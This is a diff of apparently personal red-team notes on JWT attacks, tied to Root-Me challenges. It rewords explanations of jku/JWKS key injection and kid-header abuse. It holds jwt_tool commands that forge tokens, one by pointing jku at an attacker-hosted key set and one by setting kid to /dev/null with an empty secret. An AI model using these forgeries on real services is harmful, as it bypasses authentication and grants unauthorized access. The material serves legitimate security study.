@@ -107,7 +107,7 @@ $ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
 $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
 ```
 
-📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight on URLs <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).
+📚 You may check: `/jwks.json`, `/.well-known/jwks.json`, etc. Refer to [SSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/ssrf.md) for insight <small>(filtering, attacks, etc.)</small> and setting up a [grabber](/cybersecurity/red-team/_knowledge/topics/request_grabber.md).
 
 <br>
 
@@ -118,15 +118,14 @@ $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
 [![jwt_public_key](../../../../_badges/rootme/web_server/jwt_public_key.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
 [![jwt_unsecure_file_signature](../../../../_badges/rootme/web_server/jwt_unsecure_file_signature.svg)](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
 
-The kid header may be present in two scenarios. The first one is to define which key file to use: `-p` must match the contents of `/dev/null`.
+The kid header may be present in two scenarios. The first one is to define which key file contains the secret. The second usage is to determines which of the keys in the `jku` we should use.
 
 ```shell!
+$ # The file "/dev/null" is empty so -p is ""
 $ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
 ```
 
-The `kid` header may be used along with `jku`. The JSON file pointed by `jku` may contain multiple keys, and `kid` determines which one to use.
-
-➡️ Refer to [Path Traversal](/cybersecurity/red-team/s3.exploitation/vulns/web/path_traversal.md) if there is some filtering.
+➡️ Refer to [Path Traversal](/cybersecurity/red-team/s3.exploitation/vulns/web/path_traversal.md) and my [cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/arbitrary_file_access.md) for more notes.
 
 <br>
 
